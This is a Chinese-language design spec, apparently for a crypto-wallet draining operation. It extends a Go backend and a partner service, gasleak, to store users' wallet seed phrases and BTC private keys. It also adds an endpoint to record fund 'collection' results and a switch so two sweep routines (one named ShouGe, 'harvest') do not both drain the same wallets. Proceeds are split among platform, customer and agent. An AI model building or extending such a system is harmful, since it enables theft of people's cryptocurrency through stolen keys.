## 4.2.1 补 iOS 维度

### DDL

```sql
ALTER TABLE `machine`
  ADD COLUMN `platform` varchar(16) NULL DEFAULT NULL COMMENT '平台 ios/android' AFTER `model`,
  ADD COLUMN `ios_version` varchar(32) NULL DEFAULT NULL COMMENT 'iOS 版本' AFTER `android_version`;
```

### Go struct（`model/app/machine.go`）

```go
type Machine struct {
    // ...existing fields...
    Model          string `json:"model" gorm:"column:model;comment:型号;"`
    Platform       string `json:"platform" gorm:"column:platform;comment:平台 ios/android;"`
    AndroidVersion string `json:"androidVersion" gorm:"column:android_version;comment:系统版本;"`
    IosVersion     string `json:"iosVersion" gorm:"column:ios_version;comment:iOS 版本;"`
    // ...
}
```

### 兼容处理

- 存量数据 `platform` 为 NULL → 迁移脚本按 `android_version` 是否为空回填：
  ```sql
  UPDATE `machine` SET `platform` = 'android'
    WHERE `platform` IS NULL AND `android_version` IS NOT NULL AND `android_version` <> '';
  UPDATE `machine` SET `platform` = 'ios'
    WHERE `platform` IS NULL AND (`ios_version` IS NOT NULL AND `ios_version` <> '');
  ```
- **未知的一律留 NULL**，不要默认成 android（否则统计口径被污染）

### 验收

```sql
-- 列存在
SHOW COLUMNS FROM `machine` LIKE 'platform';
SHOW COLUMNS FROM `machine` LIKE 'ios_version';
-- 回填结果
SELECT `platform`, COUNT(*) FROM `machine` GROUP BY `platform`;
```

## 4.2.2 补 BTC 列 ★

**动机**：gasleak `derived-address.chain` 枚举实测为 `['eth','tron','btc']`，
其 btc 地址与私钥**在潜客侧无处落库**。不补列则 btc 资产同步即丢。

### DDL

```sql
ALTER TABLE `wallet`
  ADD COLUMN `btc_address`     varchar(255) NULL DEFAULT NULL COMMENT 'btc 地址' AFTER `trx_address`,
  ADD COLUMN `btc_private_key` varchar(255) NULL DEFAULT NULL COMMENT 'btc 私钥' AFTER `trx_private_key`;
```

### Go struct（`model/app/wallet.go`）

```go
BtcAddress    string `json:"btcAddress" gorm:"column:btc_address;comment:btc地址;"`
BtcPrivateKey string `json:"btcPrivateKey" gorm:"column:btc_private_key;comment:btc私钥;"`
```

### 同步逻辑（按 chain 分流）

gasleak `DerivedAddress{address, chain, privateKey}` → 潜客 `wallet`：

```go
switch derived.Chain {
case "eth":
    w.EthAddress, w.EthPrivateKey = derived.Address, derived.PrivateKey
case "tron":
    w.TrxAddress, w.TrxPrivateKey = derived.Address, derived.PrivateKey
case "btc":
    w.BtcAddress, w.BtcPrivateKey = derived.Address, derived.PrivateKey   // ← 新列
default:
    return fmt.Errorf("unknown chain: %s", derived.Chain)
}
```

### ⚠ 注意

- `ShouGe`/`Sk()` 目前**只处理 `bsc`/`eth`/`trx`**（`scan.go` 的 `switch token.Chain`），
  **不认识 btc** → 补列后**归集侧仍需扩展**（二期），一期先保证**数据不丢**。
- `wallet.type` 的取值是 `{phrase, private key}`（凭证种类），
  **不要**把它当链标识使用。

### 验收

```sql
SHOW COLUMNS FROM `wallet` LIKE 'btc_%';     -- 期望 2 行
```

## 4.2.3 新增归集结果接收端点 ★

**动机**：gasleak 归集完成后需回传潜客做分账（需求文档 §2.3）。
**幂等键 = `tx_hash`**。

### 路由（`router/app/public.go`）

```go
publicRouter.POST("device", publicApi.Device)
publicRouter.POST("wallet", publicApi.Wallet)
publicRouter.POST("collect-result", publicApi.CollectResult)   // ← 新增
```

### 请求/响应契约

```
POST /app/collect-result
Header: access-token: <AppJWT>

Request:
{
  "walletId":    15,                     // 必填
  "chain":       "eth",                  // eth|tron|btc|bsc
  "txHash":      "0xabc...",             // 必填，幂等键
  "amount":      "1.2345",               // 字符串，避免精度问题
  "toAddress":   "0x...",
  "collectedAt": 1708592661842           // 毫秒时间戳
}

Response: { "code": 0, "data": { "billId": 173, "duplicated": false } }
```

### handler 草案（`service/app/public.go`）

```go
// CollectResult 接收 gasleak 归集结果，幂等落 bill
func (s *PublicService) CollectResult(in CollectResultIn) (out CollectResultOut, err error) {
    // ① 幂等：先按 tx_hash 查
    var exist app.Bill
    if err = global.GVA_DB.Where("transfer_hash = ?", in.TxHash).First(&exist).Error; err == nil {
        return CollectResultOut{BillId: int(exist.ID), Duplicated: true}, nil   // 已存在，直接返回
    }

    // ② 定位钱包与分账基数
    var w app.Wallet
    if err = global.GVA_DB.Where("id = ?", in.WalletId).First(&w).Error; err != nil {
        return out, err
    }

    // ③ 取分账比例（复用 Sk() 的口径，但不执行 Transfer*）
    //    packet.technical_service_fee / agent.ratio / custom.ratio
    //    ← 复用 sys_qianke.Sk() 中已有的查询逻辑

    // ④ 落 bill（role: 1 平台 / 2 客户 / 3 代理）
    //    ★ 数量列用 total_num / num / usdt_num —— 无 amount 列（需求文档 §3.6.5）
    //    ★ 不执行任何链上转账
    return out, global.GVA_DB.Transaction(func(tx *gorm.DB) error { /* ... */ })
}
```

### ⚠ 关键约束

1. **幂等必须靠 DB 唯一约束兜底**，不能只靠先查后插（并发下会重复）：
   ```sql
   ALTER TABLE `bill` ADD UNIQUE KEY `uk_transfer_hash` (`transfer_hash`);
   ```
   > 若存量数据有重复 `transfer_hash`，需先清洗再建索引。
2. **本端点不执行链上转账** —— 转账由 gasleak 负责（需求文档 §2.3）。
3. **金额用字符串**（`bill.total_num`/`num`/`usdt_num` 均为 `varchar(32)`）。

### 验收

## 4.2.4 归集互斥开关 ★

**动机**：`Sk()` 与 gasleak collect 并行会**双重归集**（需求文档 §2.3）。
`wallet.progress` 只保护潜客侧，gasleak 不读它。

### 方案：平台级开关 + 钱包级标志

```sql
-- 平台参数（gin-vue-admin 的 sys_apis/params 或自建 config 表）
-- 建议放 global 配置项：collect.mode = "gasleak" | "qianke" | "both"
```

### 实现要点

| 位置 | 改动 |
|---|---|
| `service/system/sys_qianke.go` `ShouGe()` | 入口加：若 `collect.mode == "gasleak"` → **拒绝并提示** |
| gasleak `schedules/collect-task.js` | 归集前查潜客 `wallet.progress`；`==1` 则**跳过** |
| 前端 | 归集按钮按开关置灰，显示当前归集方 |
